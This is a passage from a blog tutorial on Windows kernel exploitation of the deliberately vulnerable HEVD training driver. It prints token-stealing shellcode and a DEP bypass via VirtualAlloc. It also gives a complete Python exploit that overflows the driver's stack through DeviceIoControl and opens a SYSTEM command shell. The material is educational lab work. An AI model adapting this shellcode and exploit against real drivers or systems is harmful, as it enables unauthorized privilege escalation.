<span class="n">mov</span> <span class="n">edx</span><span class="p">,</span> <span class="p">[</span><span class="n">eax</span> <span class="o">+</span> <span class="n">TOKEN_OFFSET</span><span class="p">]</span>        <span class="p">;</span> <span class="n">Get</span> <span class="n">SYSTEM</span> <span class="n">process</span> <span class="n">nt</span><span class="o">!</span><span class="n">_EPROCESS</span><span class="p">.</span><span class="n">Token</span>
<span class="n">mov</span> <span class="p">[</span><span class="n">ecx</span> <span class="o">+</span> <span class="n">TOKEN_OFFSET</span><span class="p">],</span> <span class="n">edx</span>        <span class="p">;</span> <span class="n">Replace</span> <span class="n">target</span> <span class="n">process</span> <span class="n">nt</span><span class="o">!</span><span class="n">_EPROCESS</span><span class="p">.</span><span class="n">Token</span>
                                     <span class="p">;</span> <span class="n">with</span> <span class="n">SYSTEM</span> <span class="n">process</span> <span class="n">nt</span><span class="o">!</span><span class="n">_EPROCESS</span><span class="p">.</span><span class="n">Token</span>
<span class="p">;</span> <span class="n">End</span> <span class="n">of</span> <span class="n">Token</span> <span class="n">Stealing</span> <span class="n">Stub</span>

<span class="n">popad</span>                                <span class="p">;</span> <span class="n">Restore</span> <span class="n">registers</span> <span class="n">state</span>

<span class="p">;</span> <span class="n">Kernel</span> <span class="n">Recovery</span> <span class="n">Stub</span>
<span class="n">xor</span> <span class="n">eax</span><span class="p">,</span> <span class="n">eax</span>                         <span class="p">;</span> <span class="n">Set</span> <span class="n">NTSTATUS</span> <span class="n">SUCCEESS</span>
<span class="n">add</span> <span class="n">esp</span><span class="p">,</span> <span class="mi">12</span>                          <span class="p">;</span> <span class="n">Fix</span> <span class="n">the</span> <span class="n">stack</span>
<span class="n">pop</span> <span class="n">ebp</span>                              <span class="p">;</span> <span class="n">Restore</span> <span class="n">saved</span> <span class="n">EBP</span>
<span class="n">ret</span> <span class="mi">8</span>                                <span class="p">;</span> <span class="n">Return</span> <span class="n">cleanly</span>
</pre></table></code></div></div><p>Comments are self-explanatory. The code replaces current’s process token with the SYSTEM process token. If we execute then the Command Line, it’ll run in the SYSTEM user context. Above code has been translated into assembly e.g. <a href="https://rootkits.xyz/blog/2017/08/kernel-stack-overflow/">here</a>:</p><div class="language-c++ highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
</pre><td class="rouge-code"><pre><span class="n">shellcode</span> <span class="o">=</span> <span class="p">(</span>
    <span class="n">b</span><span class="s">"</span><span class="se">\x60</span><span class="s">"</span>                            <span class="err">#</span> <span class="n">pushad</span>
    <span class="n">b</span><span class="s">"</span><span class="se">\x31\xc0</span><span class="s">"</span>                        <span class="err">#</span> <span class="n">xor</span> <span class="n">eax</span><span class="p">,</span><span class="n">eax</span>
    <span class="n">b</span><span class="s">"</span><span class="se">\x64\x8b\x80\x24\x01\x00\x00</span><span class="s">"</span>    <span class="err">#</span> <span class="n">mov</span> <span class="n">eax</span><span class="p">,[</span><span class="n">fs</span><span class="o">:</span><span class="n">eax</span><span class="o">+</span><span class="mh">0x124</span><span class="p">]</span>

    <span class="n">b</span><span class="s">"</span><span class="se">\x8b\x40\x50</span><span class="s">"</span>                    <span class="err">#</span> <span class="n">mov</span> <span class="n">eax</span><span class="p">,[</span><span class="n">eax</span><span class="o">+</span><span class="mh">0x50</span><span class="p">]</span>

    <span class="n">b</span><span class="s">"</span><span class="se">\x89\xc1</span><span class="s">"</span>                        <span class="err">#</span> <span class="n">mov</span> <span class="n">ecx</span><span class="p">,</span><span class="n">eax</span>

    <span class="n">b</span><span class="s">"</span><span class="se">\xba\x04\x00\x00\x00</span><span class="s">"</span>            <span class="err">#</span> <span class="n">mov</span> <span class="n">edx</span><span class="p">,</span><span class="mh">0x4</span>

    <span class="n">b</span><span class="s">"</span><span class="se">\x8b\x80\xb8\x00\x00\x00</span><span class="s">"</span>        <span class="err">#</span> <span class="n">mov</span> <span class="n">eax</span><span class="p">,[</span><span class="n">eax</span><span class="o">+</span><span class="mh">0xb8</span><span class="p">]</span>
    <span class="n">b</span><span class="s">"</span><span class="se">\x2d\xb8\x00\x00\x00</span><span class="s">"</span>            <span class="err">#</span> <span class="n">sub</span> <span class="n">eax</span><span class="p">,</span><span class="mh">0xb8</span>
    <span class="n">b</span><span class="s">"</span><span class="se">\x39\x90\xb4\x00\x00\x00</span><span class="s">"</span>        <span class="err">#</span> <span class="n">cmp</span> <span class="p">[</span><span class="n">eax</span><span class="o">+</span><span class="mh">0xb4</span><span class="p">],</span><span class="n">edx</span>
    <span class="n">b</span><span class="s">"</span><span class="se">\x75\xed</span><span class="s">"</span>                        <span class="err">#</span> <span class="n">jnz</span> <span class="mh">0x1a</span>
    
    <span class="n">b</span><span class="s">"</span><span class="se">\x8b\x90\xf8\x00\x00\x00</span><span class="s">"</span>        <span class="err">#</span> <span class="n">mov</span> <span class="n">edx</span><span class="p">,[</span><span class="n">eax</span><span class="o">+</span><span class="mh">0xf8</span><span class="p">]</span> <span class="n">Get</span> <span class="n">SYSTEM</span> <span class="n">process</span> <span class="n">nt</span><span class="o">!</span><span class="n">_EPROCESS</span><span class="p">.</span><span class="n">Token</span>
    <span class="n">b</span><span class="s">"</span><span class="se">\x89\x91\xf8\x00\x00\x00</span><span class="s">"</span>        <span class="err">#</span> <span class="n">mov</span> <span class="p">[</span><span class="n">ecx</span><span class="o">+</span><span class="mh">0xf8</span><span class="p">],</span><span class="n">edx</span>

    <span class="n">b</span><span class="s">"</span><span class="se">\x61</span><span class="s">"</span>                            <span class="err">#</span> <span class="n">popad</span>  <span class="n">Restore</span> <span class="n">registers</span> <span class="n">state</span>

    <span class="n">b</span><span class="s">"</span><span class="se">\x31\xc0</span><span class="s">"</span>                        <span class="err">#</span> <span class="n">xor</span> <span class="n">eax</span><span class="p">,</span><span class="n">eax</span>
    <span class="n">b</span><span class="s">"</span><span class="se">\x5d</span><span class="s">"</span>                            <span class="err">#</span> <span class="n">pop</span> <span class="n">ebp</span>
    <span class="n">b</span><span class="s">"</span><span class="se">\xc2\x08\x00</span><span class="s">"</span>                    <span class="err">#</span> <span class="n">ret</span> <span class="mh">0x8</span>
<span class="p">)</span>
</pre></table></code></div></div><p>One last thing to take care of is the Data Execution Prevention<sup id="fnref:4" role="doc-noteref"><a href="#fn:4" class="footnote" rel="footnote">4</a></sup> security mechanism that would block our shellcode if we run it directly from the stack. To bypass that, we could use e.g. VirtualAlloc function<strong><sup id="fnref:5" role="doc-noteref"><a href="#fn:5" class="footnote" rel="footnote">5</a></sup></strong> that will allocate an executable piece of memory for us:</p><div class="language-c++ highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
</pre><td class="rouge-code"><pre><span class="cp"># Bypass DEP and allocate executable memory for shellcode
</span><span class="n">va_ptr</span> <span class="o">=</span> <span class="n">kernel32</span><span class="p">.</span><span class="n">VirtualAlloc</span><span class="p">(</span>
    <span class="n">c_int</span><span class="p">(</span><span class="mi">0</span><span class="p">),</span>                   <span class="err">#</span> <span class="n">lpAddress</span>
    <span class="n">c_int</span><span class="p">(</span><span class="n">len</span><span class="p">(</span><span class="n">shellcode</span><span class="p">)),</span>      <span class="err">#</span> <span class="n">dwSize</span>
    <span class="n">c_int</span><span class="p">(</span><span class="mh">0x3000</span><span class="p">),</span>              <span class="err">#</span> <span class="n">flAllocationType</span> <span class="p">(</span><span class="n">MEM_COMMIT</span> <span class="o">|</span> <span class="n">MEM_RESERVE</span><span class="p">)</span>
    <span class="n">c_int</span><span class="p">(</span><span class="mh">0x40</span><span class="p">))</span>                <span class="err">#</span> <span class="n">flProtect</span> <span class="p">(</span><span class="n">PAGE_EXECUTE_READWRITE</span><span class="p">)</span>


<span class="cp"># Move shellcode to the allocated memory
</span><span class="n">kernel32</span><span class="p">.</span><span class="n">RtlMoveMemory</span><span class="p">(</span>
    <span class="n">c_int</span><span class="p">(</span><span class="n">va_ptr</span><span class="p">),</span>              <span class="err">#</span> <span class="n">Destination</span>
    <span class="n">shellcode</span><span class="p">,</span>                  <span class="err">#</span> <span class="n">Source</span>
    <span class="n">c_int</span><span class="p">(</span><span class="n">len</span><span class="p">(</span><span class="n">shellcode</span><span class="p">))</span>       <span class="err">#</span> <span class="n">Length</span>
<span class="p">)</span>
</pre></table></code></div></div><p>We are ready now to build the final shellcode, which looks like this:</p><div class="language-c++ highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
</pre><td class="rouge-code"><pre><span class="n">import</span> <span class="n">ctypes</span><span class="p">,</span> <span class="n">sys</span><span class="p">,</span> <span class="k">struct</span>
<span class="nc">from</span> <span class="n">ctypes</span> <span class="n">import</span> <span class="o">*</span>
<span class="n">from</span> <span class="n">subprocess</span> <span class="n">import</span> <span class="o">*</span>

<span class="n">kernel32</span> <span class="o">=</span> <span class="n">windll</span><span class="p">.</span><span class="n">kernel32</span>

<span class="cp"># open handle to the device
</span><span class="n">hevd</span> <span class="o">=</span> <span class="n">kernel32</span><span class="p">.</span><span class="n">CreateFileW</span><span class="p">(</span>
    <span class="s">"</span><span class="se">\\\\</span><span class="s">.</span><span class="se">\\</span><span class="s">HackSysExtremeVulnerableDriver"</span><span class="p">,</span>    <span class="err">#</span> <span class="n">file</span> <span class="n">name</span>
    <span class="mh">0xC0000000</span><span class="p">,</span>     <span class="err">#</span> <span class="n">access</span><span class="o">:</span> <span class="n">GENERIC</span> <span class="n">READ</span> <span class="o">|</span> <span class="n">GENERIC</span> <span class="n">WRITE</span><span class="p">,</span> <span class="n">bits</span> <span class="mi">30</span> <span class="n">and</span> <span class="mi">31</span> <span class="n">are</span> <span class="n">set</span>
    <span class="mi">0</span><span class="p">,</span>                                          
    <span class="n">None</span><span class="p">,</span>
    <span class="mh">0x3</span><span class="p">,</span>            <span class="err">#</span> <span class="n">action</span> <span class="n">to</span> <span class="n">take</span> <span class="n">on</span> <span class="n">a</span> <span class="n">device</span><span class="o">:</span> <span class="n">OPEN</span> <span class="n">EXISTING</span> 
    <span class="mi">0</span><span class="p">,</span>
    <span class="n">None</span>
<span class="p">)</span>
    
<span class="k">if</span> <span class="p">(</span><span class="n">not</span> <span class="n">hevd</span><span class="p">)</span> <span class="n">or</span> <span class="p">(</span><span class="n">hevd</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span><span class="o">:</span>
    <span class="n">print</span><span class="p">(</span><span class="s">"[-] Failed to retrieve handle: "</span> <span class="o">+</span> <span class="n">str</span><span class="p">(</span><span class="n">GetLastError</span><span class="p">()))</span>
    <span class="n">sys</span><span class="p">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>


<span class="n">shellcode</span> <span class="o">=</span> <span class="p">(</span>
    <span class="n">b</span><span class="s">"</span><span class="se">\x60</span><span class="s">"</span>                            <span class="err">#</span> <span class="n">pushad</span>
    <span class="n">b</span><span class="s">"</span><span class="se">\x31\xc0</span><span class="s">"</span>                        <span class="err">#</span> <span class="n">xor</span> <span class="n">eax</span><span class="p">,</span><span class="n">eax</span>
    <span class="n">b</span><span class="s">"</span><span class="se">\x64\x8b\x80\x24\x01\x00\x00</span><span class="s">"</span>    <span class="err">#</span> <span class="n">mov</span> <span class="n">eax</span><span class="p">,[</span><span class="n">fs</span><span class="o">:</span><span class="n">eax</span><span class="o">+</span><span class="mh">0x124</span><span class="p">]</span>

    <span class="n">b</span><span class="s">"</span><span class="se">\x8b\x40\x50</span><span class="s">"</span>                    <span class="err">#</span> <span class="n">mov</span> <span class="n">eax</span><span class="p">,[</span><span class="n">eax</span><span class="o">+</span><span class="mh">0x50</span><span class="p">]</span>

    <span class="n">b</span><span class="s">"</span><span class="se">\x89\xc1</span><span class="s">"</span>                        <span class="err">#</span> <span class="n">mov</span> <span class="n">ecx</span><span class="p">,</span><span class="n">eax</span>

    <span class="n">b</span><span class="s">"</span><span class="se">\xba\x04\x00\x00\x00</span><span class="s">"</span>            <span class="err">#</span> <span class="n">mov</span> <span class="n">edx</span><span class="p">,</span><span class="mh">0x4</span>

    <span class="n">b</span><span class="s">"</span><span class="se">\x8b\x80\xb8\x00\x00\x00</span><span class="s">"</span>        <span class="err">#</span> <span class="n">mov</span> <span class="n">eax</span><span class="p">,[</span><span class="n">eax</span><span class="o">+</span><span class="mh">0xb8</span><span class="p">]</span>
    <span class="n">b</span><span class="s">"</span><span class="se">\x2d\xb8\x00\x00\x00</span><span class="s">"</span>            <span class="err">#</span> <span class="n">sub</span> <span class="n">eax</span><span class="p">,</span><span class="mh">0xb8</span>
    <span class="n">b</span><span class="s">"</span><span class="se">\x39\x90\xb4\x00\x00\x00</span><span class="s">"</span>        <span class="err">#</span> <span class="n">cmp</span> <span class="p">[</span><span class="n">eax</span><span class="o">+</span><span class="mh">0xb4</span><span class="p">],</span><span class="n">edx</span>
    <span class="n">b</span><span class="s">"</span><span class="se">\x75\xed</span><span class="s">"</span>                        <span class="err">#</span> <span class="n">jnz</span> <span class="mh">0x1a</span>
    
    <span class="n">b</span><span class="s">"</span><span class="se">\x8b\x90\xf8\x00\x00\x00</span><span class="s">"</span>        <span class="err">#</span> <span class="n">mov</span> <span class="n">edx</span><span class="p">,[</span><span class="n">eax</span><span class="o">+</span><span class="mh">0xf8</span><span class="p">]</span> <span class="n">Get</span> <span class="n">SYSTEM</span> <span class="n">process</span> <span class="n">nt</span><span class="o">!</span><span class="n">_EPROCESS</span><span class="p">.</span><span class="n">Token</span>
    <span class="n">b</span><span class="s">"</span><span class="se">\x89\x91\xf8\x00\x00\x00</span><span class="s">"</span>        <span class="err">#</span> <span class="n">mov</span> <span class="p">[</span><span class="n">ecx</span><span class="o">+</span><span class="mh">0xf8</span><span class="p">],</span><span class="n">edx</span>

    <span class="n">b</span><span class="s">"</span><span class="se">\x61</span><span class="s">"</span>                            <span class="err">#</span> <span class="n">popad</span>  <span class="n">Restore</span> <span class="n">registers</span> <span class="n">state</span>

    <span class="n">b</span><span class="s">"</span><span class="se">\x31\xc0</span><span class="s">"</span>                        <span class="err">#</span> <span class="n">xor</span> <span class="n">eax</span><span class="p">,</span><span class="n">eax</span>
    <span class="n">b</span><span class="s">"</span><span class="se">\x5d</span><span class="s">"</span>                            <span class="err">#</span> <span class="n">pop</span> <span class="n">ebp</span>
    <span class="n">b</span><span class="s">"</span><span class="se">\xc2\x08\x00</span><span class="s">"</span>                    <span class="err">#</span> <span class="n">ret</span> <span class="mh">0x8</span>
<span class="p">)</span>


<span class="cp"># Bypass DEP and allocate executable memory for shellcode
</span><span class="n">va_ptr</span> <span class="o">=</span> <span class="n">kernel32</span><span class="p">.</span><span class="n">VirtualAlloc</span><span class="p">(</span>
    <span class="n">c_int</span><span class="p">(</span><span class="mi">0</span><span class="p">),</span>                   <span class="err">#</span> <span class="n">lpAddress</span>
    <span class="n">c_int</span><span class="p">(</span><span class="n">len</span><span class="p">(</span><span class="n">shellcode</span><span class="p">)),</span>      <span class="err">#</span> <span class="n">dwSize</span>
    <span class="n">c_int</span><span class="p">(</span><span class="mh">0x3000</span><span class="p">),</span>              <span class="err">#</span> <span class="n">flAllocationType</span> <span class="p">(</span><span class="n">MEM_COMMIT</span> <span class="o">|</span> <span class="n">MEM_RESERVE</span><span class="p">)</span>
    <span class="n">c_int</span><span class="p">(</span><span class="mh">0x40</span><span class="p">))</span>                <span class="err">#</span> <span class="n">flProtect</span> <span class="p">(</span><span class="n">PAGE_EXECUTE_READWRITE</span><span class="p">)</span>


<span class="cp"># Move shellcode to the allocated memory
</span><span class="n">kernel32</span><span class="p">.</span><span class="n">RtlMoveMemory</span><span class="p">(</span>
    <span class="n">c_int</span><span class="p">(</span><span class="n">va_ptr</span><span class="p">),</span>              <span class="err">#</span> <span class="n">Destination</span>
    <span class="n">shellcode</span><span class="p">,</span>                  <span class="err">#</span> <span class="n">Source</span>
    <span class="n">c_int</span><span class="p">(</span><span class="n">len</span><span class="p">(</span><span class="n">shellcode</span><span class="p">))</span>       <span class="err">#</span> <span class="n">Length</span>
<span class="p">)</span>

<span class="n">payload</span> <span class="o">=</span> <span class="k">struct</span><span class="p">.</span><span class="n">pack</span><span class="p">(</span><span class="s">"&lt;L"</span><span class="p">,</span> <span class="n">va_ptr</span><span class="p">)</span>

<span class="cp"># evil buffer
</span><span class="n">buf</span> <span class="o">=</span> <span class="n">b</span><span class="s">"A"</span><span class="o">*</span><span class="mi">2080</span> <span class="o">+</span> <span class="n">payload</span>
<span class="n">buf_size</span> <span class="o">=</span> <span class="n">len</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span>

<span class="cp"># send message to the device
</span><span class="n">kernel32</span><span class="p">.</span><span class="n">DeviceIoControl</span><span class="p">(</span>
    <span class="n">hevd</span><span class="p">,</span>               <span class="err">#</span> <span class="n">device</span> <span class="n">handle</span>
    <span class="mh">0x222003</span><span class="p">,</span>           <span class="err">#</span> <span class="n">IOCTL</span>
    <span class="n">buf</span><span class="p">,</span>            
    <span class="n">buf_size</span><span class="p">,</span>       
    <span class="n">None</span><span class="p">,</span>
    <span class="mi">0</span><span class="p">,</span>
    <span class="n">byref</span><span class="p">(</span><span class="n">c_ulong</span><span class="p">()),</span>
    <span class="n">None</span>
<span class="p">)</span>

<span class="n">Popen</span><span class="p">(</span><span class="s">"start cmd"</span><span class="p">,</span> <span class="n">shell</span><span class="o">=</span><span class="n">True</span><span class="p">)</span>
</pre></table></code></div></div><p>After execution, we get the Command Line as NT Authority\SYSTEM user:</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/win7_shell.png" alt="Command Line as SYSTEM" /></p><h2 id="references"><span class="myheader">References<span></span></span></h2><div class="footnotes" role="doc-endnotes"><ol><li id="fn:1" role="doc-endnote"><p>https://www.osronline.com/article.cfm%5earticle=229.htm <a href="#fnref:1" class="reversefootnote" role="doc-backlink">&#8617;</a></p><li id="fn:2" role="doc-endnote"><p>https://docs.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-createfilew <a href="#fnref:2" class="reversefootnote" role="doc-backlink">&#8617;</a></p><li id="fn:3" role="doc-endnote"><p>https://github.com/hacksysteam/HackSysExtremeVulnerableDriver/blob/master/Exploit/Payloads.c <a href="#fnref:3" class="reversefootnote" role="doc-backlink">&#8617;</a></p><li id="fn:4" role="doc-endnote"><p>https://docs.microsoft.com/en-us/windows/win32/memory/data-execution-prevention <a href="#fnref:4" class="reversefootnote" role="doc-backlink">&#8617;</a></p><li id="fn:5" role="doc-endnote"><p>https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc <a href="#fnref:5" class="reversefootnote" role="doc-backlink">&#8617;</a></p></ol></div></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/hevd/'>HEVD</a>, <a href='/categories/stack-overflow/'>Stack Overflow</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/exploit/" class="post-tag no-text-decoration" >exploit</a> <a href="/tags/driver/" class="post-tag no-text-decoration" >driver</a> <a href="/tags/x86/" class="post-tag no-text-decoration" >x86</a> <a href="/tags/shellcode/" class="post-tag no-text-decoration" >shellcode</a> <a href="/tags/kernel-exploitation/" class="post-tag no-text-decoration" >kernel exploitation</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=HEVD: Stack Overflow exploitation - Hello World&url=https://wojtekgoo.github.io/posts/HEVD_Stack_Overflow/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=HEVD: Stack Overflow exploitation - Hello World&u=https://wojtekgoo.github.io/posts/HEVD_Stack_Overflow/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://www.linkedin.com/sharing/share-offsite/?url=https://wojtekgoo.github.io/posts/HEVD_Stack_Overflow/" data-toggle="tooltip" data-placement="top" title="Linkedin" target="_blank" rel="noopener" aria-label="Linkedin"> <i class="fa-fw fab fa-linkedin"></i> </a> <i class="fa-fw fas fa-link small" onclick="copyLink()" data-toggle="tooltip" data-placement="top" title="Copy link"></i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-tags"> <span>Trending Tags</span><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/driver/">driver</a> <a class="post-tag" href="/tags/x86/">x86</a> <a class="post-tag" href="/tags/exploit/">exploit</a> <a class="post-tag" href="/tags/kernel-exploitation/">kernel exploitation</a> <a class="post-tag" href="/tags/shellcode/">shellcode</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"> <span class="pl-3 pt-2 mb-2">Contents</span><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/A_Primer_On_Windows_Drivers/"><div class="card-body"> <span class="timeago small" > Jan 1 <i class="unloaded">2022-01-01T09:00:00+01:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>A primer on Windows drivers</h3><div class="text-muted small"><p> HEVD Over the next few posts in this series I am going to be looking at Windows kernel exploitation via the Hacksys Extreme Vulnerable Driver. This is a wonderful piece of software with intentiona...</p></div></div></a></div><div class="card"> <a href="/posts/Glossary/"><div class="card-body"> <span class="timeago small" > Dec 31, 2021 <i class="unloaded">2021-12-31T09:00:00+01:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Glossary</h3><div class="text-muted small"><p> TEST TODO</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/A_Primer_On_Windows_Drivers/" class="btn btn-outline-primary" prompt="Older"><p>A primer on Windows drivers</p></a> <span class="btn btn-outline-primary disabled" prompt="Newer"><p>-</p></span></div></div></div></div><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lozad/dist/lozad.min.js"></script> <script type="text/javascript"> const imgs = document.querySelectorAll('.post-content img'); const observer = lozad(imgs); observer.observe(); </script><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"><p class="mb-0"> © 2022 <a href="https://github.com/wojtekgoo">Wojtek</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending Tags</h4><a class="post-tag" href="/tags/driver/">driver</a> <a class="post-tag" href="/tags/x86/">x86</a> <a class="post-tag" href="/tags/exploit/">exploit</a> <a class="post-tag" href="/tags/kernel-exploitation/">kernel exploitation</a> <a class="post-tag" href="/tags/shellcode/">shellcode</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="https://wojtekgoo.github.io{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script>
